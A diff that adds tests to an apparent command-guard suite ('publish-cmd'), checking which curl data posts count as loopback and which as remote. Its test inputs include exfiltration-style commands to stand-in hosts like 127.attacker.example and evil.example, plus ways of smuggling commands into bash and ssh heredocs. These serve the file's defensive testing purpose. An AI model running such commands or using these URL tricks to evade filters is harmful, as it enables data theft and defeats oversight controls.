@@ -461,4 +461,15 @@ unseen 'echo x | "bash"'                                                 "a pipe
 per_line $'ba\\sh <<EOF\ngh pr comment 1 -b x\nEOF'                       'ba\sh <<'                  "an escaped shell's heredoc"
 per_line $'ssh host \'bash -s\' <<EOF\ngh pr comment 1 -b x\nEOF'         "ssh host 'bash -s' <<"     "a quoted shell's heredoc on another host"
 
+# Only a dotted 127 address is loopback, and a bare URL's host ends at its first / (#128).
+blocks 'curl -d x http://127.attacker.example/'                          "a public name that starts with 127."
+blocks 'curl -d x https://127.0.0.1.attacker.example/x'                  "a public name that holds a loopback address"
+blocks 'curl -d x evil.example/x://foo.local'                            "a bare remote URL whose path holds a local one"
+allows 'curl -d x foo.local/x://evil.example'                            "a bare local URL whose path holds a remote one"
+allows 'curl -d x http://127.0.0.1:8080/x'                               "a loopback address with a port"
+allows 'curl -d x http://127.10.20.30/x'                                 "any dotted 127 address"
+allows 'curl -d x "http://127.0.0.1"'                                    "a quoted loopback address, its quote read as the end"
+allows "curl -d x 'http://127.0.0.1'"                                    "a single-quoted loopback address"
+allows 'curl localhost'                                                  "a read from localhost"
+
 finish "publish-cmd"
